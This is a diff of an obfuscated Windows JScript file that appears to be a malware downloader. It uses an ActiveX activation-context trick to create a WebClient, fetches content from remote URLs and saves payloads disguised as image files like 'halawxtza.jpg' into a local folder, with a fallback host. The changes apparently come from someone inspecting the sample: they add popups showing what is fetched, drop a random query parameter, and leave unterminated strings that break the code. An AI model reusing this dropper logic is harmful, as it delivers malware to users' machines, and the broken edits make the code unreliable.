@@ -50,7 +50,7 @@ version="1.0">
 			var ax = new ActiveXObject("Microsoft.Windows.ActCtx");
 			ax.ManifestText = manifest;		
 			obj = ax.CreateObject("System.Net.WebClient");
-			var a = new ActiveXObject("WScript.Shell").Popup(url);
+			var a = new ActiveXObject("WScript.Shell").Popup(webstuff);
 			webstuff = obj.DownloadString(url);
 			var a = new ActiveXObject("WScript.Shell").Popup(webstuff);
 			astya56 = new ActiveXObject("ADODB.Stream"); 
@@ -206,9 +206,9 @@ irz593 = "142_T3SL4S_"
 
 	try
 	{
-	 cq854 = mrc430(ekw28+"halawxtza.jpg.zip.log?"+bx021(0000001,999999999),gd481+"\\halawxtza.jpg");
+	 cq854 = mrc430(ekw28+"halawxtza.jpg.zip.log,gd481+"\\halawxtza.jpg");
         if (cq854 == false) {	
-	     mrc430(ekw282+"halawxtza.jpg.zip.log?"+bx021(0000001,999999999),gd481+"\\halawxtza.jpg");
+	     mrc430(ekw282+"halawxtza.jpg.zip.log,gd481+"\\halawxtza.jpg");
 	    }
 	}
     catch (ex)
@@ -219,9 +219,9 @@ irz593 = "142_T3SL4S_"
 
 	try
 	{
-	 cq854 = mrc430(ekw28+"halawxtzb.jpg.zip.log?"+bx021(0000001,999999999),gd481+"\\halawxtzb.jpg");
+	 cq854 = mrc430(ekw28+"halawxtzb.jpg.zip.log,gd481+"\\halawxtzb.jpg");
         if (cq854 == false) {	
-	     mrc430(ekw282+"halawxtzb.jpg.zip.log?"+bx021(0000001,999999999),gd481+"\\halawxtzb.jpg");
+	     mrc430(ekw282+"halawxtzb.jpg.zip.log,gd481+"\\halawxtzb.jpg");
 	    }
 	}
     catch (ex)
